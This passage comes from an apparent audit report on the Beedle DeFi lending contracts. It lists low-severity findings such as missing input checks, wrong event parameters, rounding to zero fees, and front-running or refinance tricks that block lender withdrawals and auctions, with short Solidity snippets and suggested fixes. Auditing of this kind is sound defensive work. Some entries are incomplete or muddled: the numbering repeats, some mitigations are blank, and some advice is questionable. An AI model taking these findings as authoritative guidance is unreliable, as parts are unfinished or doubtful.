* `giveLoan()` in [L403](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L403)
* `buyLoan()` in [L505](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505)
* `seizeLoan()` in [L563](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L563)
* `refinance()` in [L651](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L651) and [L656](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L656)

**Recommended Mitigations:** Implement a Zero Address Check

### [L-2] `Beedle::Lender::giveLoan` function fails 

**Description:** Lender fails to giveLoan because of inconsistent length between `loadIds` and `poolIds`. The function assumes that loanIds and PoolIds are of equal lenght but thats not the case. For example, the lender mistakenly leaves out one of the `poolIds` which means the last `loanId` does not map to any `poolId` since `loanIds.length = poolIds.length + 1`. Hence, since there is an out-of-bounds error when getting the pool id, `poolId = poolIds[i]`, the entire function will revert due to this error.


```solidity
  for (uint256 i = 0; i < loanIds.length; i++) { 
            uint256 loanId = loanIds[i];
            bytes32 poolId = poolIds[i];
	...........
```
 
**Impact:** Transactions will revert as lengths of the arrays are not equal, so users will unable to giveLoan.

**Recomended Mitgations:** 

```solidity
function giveLoan(uint256[] calldata loanIds,bytes32[] calldata poolIds) external {
+   if (loanIds.length != poolIds.length) revert GiveLoanLengthMismatch();
    for (uint256 i = 0; i < loanIds.length; i++) {
        uint256 loanId = loanIds[i];
        bytes32 poolId = poolIds[i];
        ...
    }
}
```

### [L-3] Missing Events Emission

**Description:** There are many instances in the entires codebase that doesn't emit events on Important State changes.

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L84>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L92>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L100>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L53>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L61>

<https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L80>


**Impact:** This results into loss of important information that is not being tracked

**Recomended Mitigations:** Add events any important state change takes place

### [L-4] Zero Amount Not Allowed checks are missing

**Description:** In `Beedle::Beedle.sol` functions are missing checks that validate values passed is not zero. These function includes `mint`,`_burn`,`_mint` etc. In `Staking.sol`s functions `deposit` and `withdraw` the check for `_amount` zero is not done as well.

There are five instances of this in the contract:
\[[Instance 1](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L36)]
\[[Instance 2](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L29)]
\[[Instance 3](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L22)]
\[[Instance 4](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L38)]
\[[Instance 5](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L46)]


**Impact:** Users can pass Zero values

**Recomended Mitigations:** Implements checks for validating values passed are not zero.

### [L-5] `block.timstamp` can be manipulated

**Description:** The `block.timestamp` represents the time at which the block is mined and is determined by the miner. Although Ethereum has mechanisms in place to prevent blatant timestamp manipulation, miners still have some degree of control over the block timestamp within certain limits, known as "block time drift." This drift allows miners to adjust the timestamp by a small range, which introduces a possibility of timestamp manipulation.

```solidity
Loan memory loan = Loan({
    // ...
    startTimestamp: block.timestamp, // Borrowing timestamp is recorded here
    // ...
});
```

**Impact:** The timestamp manipulation vulnerability can lead to incorrect borrowing timestamps being recorded in the smart contract. As a result, time-sensitive operations, such as calculating interest based on loan start times, determining loan durations, and initiating time-based auctions, can be affected. Inaccurate timestamps may lead to incorrect interest calculations, unintended loan durations, and potential financial losses for both lenders and borrowers.

**Recomended Mitigations:** Using `block.number`, which represents the current block number in the Ethereum blockchain, in combination with `block.timestamp`, can add an additional layer of security.

### [L-6] Auction Ends Early as Expected

**Description:** The **[seizeLoan](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L548)** function allows users to seize a loan if an auction for them has failed. There is an [if statement](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L556C13-L556C13) that reverts the transaction if a trial to claim a loan before the end of its auction occurs.

But, there is another condition that will succeed if `block.timestamp` is equal to the end of the auction. 

**Impact:** If an user who wants to buy a loan is backrunned in a block where the timestamp matches the end of the auction, he can end up buying a loan that gets seized by a malicious actor. 

**Reomended Mitigations:** 


### [L-7] Emitting Incorrect Events

**Description:** The `Lender::refinance` emits incorrect events. The `refinance()` emits incorrect event parameters: `debt` and `collateral`.  Specifically, the `debt` and `collateral` variables in question contain amounts related to the new pool, not the previous pool.

```solidity
    function refinance(Refinance[] calldata refinances) public {
        for (uint256 i = 0; i < refinances.length; i++) {
            ...

            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
@>              debt,
@>              collateral,
                loan.interestRate,
                loan.startTimestamp
            );

            ...
        }
    }
```

**Impact:** The incorrect event logs may cause off-chain services to work in unexpected manner.

**Recommended Mitigation:** Emit the correct variable `loan.debt` and `loan.collateral` to fix the isuues.

### [L-8] Rounding Error In Borrow Function

**Description:** Rounding Errors can lead to fees being Zero 

```solidity
	// calculate the fees
	uint256 fees = (debt * borrowerFee) / 10000; 
````

Example: 
uint256 fees = (debt * borrowerFee) / 10000 = (10 * 50) / 10000 = 500 / 10000 = 0.05 = 0

**Impact:** Results in Zero Fees

**Recommended Mitigations:** Import & use fixed-point arithmetic math libraries


### [L-9] Pausable Tokens

**Description:** Some tokens can be pausable rendering the protocol non-functional. If collateralToken or loanTokens initialized are Pausable tokens such as example WBTC and if paused the Protocol will not function normally. There is no indication loanToken or collateralToken cant be Pausable tokens as any ERC20 can be initialized for pools.

**Impact:**  If the token is paused then transfers of tokens into and out of the protocol are not possible, which impacts ability to deposit, ability to pay back, ability to move loans and all other such related functionality depending on transfer, transferFrom etc functions.

**Recommended Mitigations:** It may be ideal to whitelist allowed tokens for loanToken and collateralTokens and not allow callback, hook, tokens such as ERC777, ERC1363, etc

### [L-10] User Can DOS Pool Lenders Withdrawal

**Description:** Upon a lender attempting to withdraw funds from their pool, a malicious user can front-run them and borrow all liquidity.  Then the user can back-run the pool lender's transaction and repay the loan. Because of the small duration of the loan, the interest is negligible and the pool lender cannot withdraw their funds.

**Impact:** Pool Lender cannot withdraw the funds

**Recommendations:** Add a minimum interest fee, despite the length of the borrow in order to make this attack costly for the attacker.

### [L-10] Borrower can DoS lender's auction.

**Description:** 

A lender could be auctioning a loan. Upon someone attempting to buy the loan, the borrower can just call `refinance` with the same borrow parameters to simply refresh the loan's `auctionStartTimestamp`.

```solidity
            loans[loanId].startTimestamp = block.timestamp;
            // update loan auction start timestamp
            loans[loanId].auctionStartTimestamp = type(uint256).max;
```
Now that the value of `auctionStartTimestamp` is refreshed, the call to `buyLoan` will revert due to this line of code:

```solidity
        if (loan.auctionStartTimestamp == type(uint256).max)
            revert AuctionNotStarted();
```

**Impact:** Borrower can DoS their lender's auction.

**Recommended Mitigations:** If a refinance happens to the same pool, do not refresh the value of `auctionStartTimestamp`


### [L-11] User can prevent pool owner from changing minLoanSize value and auctionLength

**Description:** As there isn't a separate function to change the values of `minLoanSize` and `auctionLength`, pool owners have to use `setPool` to do so. The problem is that there is the following check:

```solidity
        if (p.outstandingLoans != pools[poolId].outstandingLoans)
            revert PoolConfig();
```

While this makes sure the accounting is correct, it opens up an attack vector. Since this is the only way to change the values of `minLoanSize` and `auctionLength`, a malicious user may be monitoring the mempool for such transactions and front-run them and borrow/ repay in order to change the value of `outstandingLoans`.

By changing it, the transaction will revert. Being able to immediately after repay the taken borrow, the interest accumulated will be negligible. Furthermore, this is an issue which could happen without any malicious actors - if there's high activity in a certain pool, it might be close to impossible to change the values of `minLoanSize` and `auctionLength`.

**Impact:** Pool owners being unable to change the values of `minLoanSize` and `auctionLength`

**Recomended Mitigations:** Make separate functions for changing the values of `minLoanSize` and `auctionLength`.

### [L-12] feeReceiver address is not fixed

**Description:** The `feeReceiver` variable is declared in the constructor by the `msg.sender` it should be initialized with the address of the Fees contract. By not initializing the `feeReceiver` variable, the fees can be sent to the contract owner and not to the Fees.sol contract that allows the exchange of tokens and take it to the staking contract.

With the initialization you had of msg.sender this would not happen.


**Impact:** You would not be using the `Fees.sol` and `Staking.sol` contracts, preventing the correct functioning of the `Lender` contract.


**Recommeded Mitigations:** 


